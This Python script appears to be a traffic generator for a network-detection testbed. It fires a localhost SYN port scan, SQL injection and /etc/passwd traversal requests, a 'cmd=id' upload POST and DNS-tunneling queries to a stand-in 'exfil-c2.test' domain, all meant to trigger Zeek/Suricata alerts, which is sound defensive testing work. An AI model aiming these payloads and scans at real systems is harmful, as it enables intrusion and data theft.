#!/usr/bin/env python3
"""
Traffic Generation Engine for BTP Testbed.
Generates realistic benign traffic and simulated attack behaviors.
Run inside the Ubuntu VM with root privileges for raw packet operations.
"""

import time
import subprocess
import requests
import random
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send


def generate_benign_traffic(interface="lo", iterations=10):
    """Generate benign HTTP, DNS, and ICMP background traffic."""
    print(f"[*] Generating {iterations} rounds of benign network traffic...")
    benign_domains = ["example.com", "google.com", "wikipedia.org", "github.com", "cloudflare.com"]

    for i in range(iterations):
        # 1. Benign DNS queries
        domain = random.choice(benign_domains)
        dns_pkt = IP(dst="127.0.0.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
        send(dns_pkt, iface=interface, verbose=False)

        # 2. Benign HTTP traffic via local curl or mock
        try:
            requests.get(f"http://127.0.0.1/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64)"}, timeout=0.5)
        except Exception:
            pass

        time.sleep(0.2)
    print("[+] Benign traffic generation completed.")


def simulate_port_scan(target_ip="127.0.0.1", ports=[21, 22, 23, 25, 80, 443, 8080, 3306]):
    """Simulate TCP SYN port scan (triggering Zeek / Suricata scan detectors)."""
    print(f"[*] Simulating port scan on {target_ip}...")
    for port in ports:
        syn_pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(syn_pkt, verbose=False)
        time.sleep(0.05)
    print("[+] Port scan simulation completed.")


def simulate_http_attacks(target_url="http://127.0.0.1"):
    """Simulate Web exploits (SQL Injection & Directory Traversal)."""
    print(f"[*] Simulating HTTP web attacks on {target_url}...")
    attack_payloads = [
        ("GET", "/login.php?user=admin%27%20OR%201=1--", "sqlmap/1.7.0"),
        ("GET", "/../../etc/passwd", "Nikto/2.1.6"),
        ("POST", "/admin/upload.php", "curl/7.68.0")
    ]
    for method, path, ua in attack_payloads:
        try:
            if method == "GET":
                requests.get(f"{target_url}{path}", headers={"User-Agent": ua}, timeout=1)
            else:
                requests.post(f"{target_url}{path}", headers={"User-Agent": ua}, data="cmd=id", timeout=1)
        except Exception:
            pass
        time.sleep(0.1)
    print("[+] HTTP attack simulation completed.")


def simulate_dns_tunneling(target_dns="127.0.0.1"):
    """Simulate DNS tunneling / exfiltration query patterns."""
    print(f"[*] Simulating DNS tunneling exfiltration...")
    for i in range(5):
        random_sub = hex(random.getrandbits(32))[2:]
        qname = f"{random_sub}.exfil-c2.test"
        pkt = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
        send(pkt, verbose=False)
        time.sleep(0.1)
    print("[+] DNS tunneling simulation completed.")


if __name__ == "__main__":
    print("=== Starting Testbed Traffic Simulation ===")
    generate_benign_traffic(iterations=5)
    simulate_port_scan()
    simulate_http_attacks()
    simulate_dns_tunneling()
    print("=== Traffic Simulation Finished ===")
